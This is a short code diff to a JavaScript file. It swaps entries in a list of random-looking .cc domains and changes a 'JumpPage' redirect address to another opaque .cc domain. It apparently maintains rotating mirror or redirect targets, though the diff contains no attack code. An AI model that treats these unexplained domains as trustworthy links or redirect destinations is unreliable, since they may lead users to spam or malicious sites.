@@ -37,12 +37,12 @@ var emails = [
 ];
 
 var urls=[
-	'ieptlqlos.cc/', 
-	'pkhhrpoed.cc/', 
-    'rwtmkmirr.cc/',
+	'mxfssufm.cc',
+	'pkhhrpoed.cc',
+	'rwtmkmirr.cc',
 ];                                                                                                                  
 
-var JumpPage="https://91ntq.com";
+var JumpPage="https://uhlocixwh.cc";
 
 var newestUrls = [];
 
